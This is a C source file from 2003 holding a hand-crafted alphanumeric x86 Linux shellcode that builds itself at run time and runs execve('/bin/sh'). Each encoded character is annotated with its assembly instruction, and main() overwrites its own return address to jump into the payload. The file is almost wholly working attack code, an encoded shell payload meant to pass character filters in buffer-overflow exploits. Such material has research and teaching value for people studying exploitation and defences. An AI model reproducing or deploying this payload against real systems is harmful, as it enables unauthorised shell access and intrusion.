/*
 *  execve ("/bin/sh"..) (linux little endian)
 *
 *  Copyright (c) 2003 Angelo Dell'Aera <buffer@antifork.org>
 *
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */


/*
 * This is an alphanumeric code  completely written by hand which builds a
 * shellcode  and then executes it. It can  be considered as the evolution
 * of  buffer-i386-raptus.c. Infact, in  that shellcode, just the last asm
 * instruction (int $0x80)  is built at  run-time.  Here anything is built
 * at run-time! Just a nice delirium, isn't it?! 8)
 * This code was developed using  Fenris by  Michael Zalewski which helped
 * me too much during development.   As you can see  from  comments below,
 * this shellcode works fine if __GNUC__ < 3. This is due to optimizations
 * introduced by gcc with __GNUC__ 3.  At this moment  it's not  available
 * a version for such compilers  but probably it will  happen in the  next
 * future. Have fun!
 */

#include <ansidecl.h>

main()
{


#if GCC_VERSION < 3000


long *ret;
char shellcode[] = 	"h3Zo0" 	 //     68 33 5a 6f 30          push   $0x306f5a33
 		   	"X"		 //     58                      pop    %eax
 		   	"5YQ7O" 	 //     35 59 51 37 4f          xor    $0x4f375159,%eax
		   	"P"		 //	50			push   %eax
			"D"		 //     44			inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
		   	"Y"		 //	59			pop    %ecx
		   	"A"		 //	41			inc    %ecx
		   	"A"           	 //     41                      inc    %ecx
		   	"A"           	 //     41                      inc    %ecx
		   	"A"           	 //     41                      inc    %ecx
		   	"A"           	 //     41                      inc    %ecx
		   	"A"           	 //     41                      inc    %ecx
		   	"A"           	 //     41                      inc    %ecx
		   	"A"           	 //     41                      inc    %ecx
		   	"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
			"A"           	 //     41                      inc    %ecx
 			"Q"              //     51                      push   %ecx
			"L"		 //	4c			dec    %esp
			"L"              //     4c                      dec    %esp
			"L"              //     4c                      dec    %esp
			"Y"              //     59                      pop    %ecx
			"hfXZn"          //     68 66 58 5a 6e          push   $0x6e565866
			"X"              //     58                      pop    %eax
                        "5404A"          //     35 34 30 34 41          xor    $0x41343034,%eax
			"P"              //     50                      push   %eax
			"Z"		 //     5a			pop    %edx
			"hGXXn"          //     68 47 58 58 6e          push   $0x6e585847
                        "X"              //     58                      pop    %eax
                        "5400A"          //     35 34 30 30 41          xor    $0x41303034,%eax
			"L"              //     4c                      dec    %esp
			"L"              //     4c                      dec    %esp
			"L"              //     4c                      dec    %esp
			"P"              //     50                      push   %eax
                        "R"              //     52                      push   %edx
			"Q"              //     51                      push   %ecx
			"D"		 //     44			inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"hn000"          //     68 6e 30 30 30          push   $0x3030306e
                        "X"              //     58                      pop    %eax
                        "5ARYO"          //     35 41 52 59 4f          xor    $0x4f595241,%eax
                        "P"              //     50                      push   %eax
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "Y"              //     59                      pop    %ecx
                        "A"              //     41                      inc    %ecx
                        "A"              //     41                      inc    %ecx
                        "A"              //     41                      inc    %ecx
			"A"              //     41                      inc    %ecx
			"A"              //     41                      inc    %ecx
			"A"              //     41                      inc    %ecx
			"A"              //     41                      inc    %ecx
			"A"              //     41                      inc    %ecx
			"A"              //     41                      inc    %ecx
			"A"              //     41                      inc    %ecx
			"Q"              //     51                      push   %ecx
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"h0000"          //     68 30 30 30 30          push   $0x30303030
                   	"X"              //     58                      pop    %eax
                   	"50000"          //     35 30 30 30 30          xor    $0x30303030,%eax
                   	"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
			"H"              //     48                      dec    %eax
 			"P"              //     50                      push   %eax
			"D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
			"P"              //     50                      push   %eax
			"Z"              //     5a                      pop    %edx
			"hffff"		 //	68 66 66 66 66		push   $66666666
                        "X"              //     58                      pop    %eax
			"54545"          //     35 34 35 34 35          xor    $0x35343534,%eax
			"P"              //     50                      push   %eax
			"D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
			"Q"              //     51                      push   %ecx
			"J"		 //     4a			dec    %edx
			"J"              //     4a                      dec    %edx
			"D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
			"R"              //     52                      push   %edx
			"D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
			"h0000"       	 //     68 30 30 30 30          push   $0x30303030
                   	"X"              //     58                      pop    %eax
                   	"50000"          //     35 30 30 30 30          xor    $0x30303030,%eax
                   	"H"              //     48                      dec    %eax
                   	"5DODO"          //     35 4f 44 4f 44          xor    $0x444f444f,%eax
                   	"5v0v0"          //     35 30 76 30 76          xor    $0x76307630,%eax
			"P"              //     50                      push   %eax
			"D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
                        "D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"D"              //     44                      inc    %esp
			"H"              //     48                      dec    %eax
	   ;


    ret = (long *)&ret + 2;
   (*ret) = (long)shellcode;

#else
#  error "This shellcode doesn't work if compiled with gcc-3.x. "
#  error "Compile it with gcc with __GNUC__ < 3! Aborting compiling...."
#endif

}

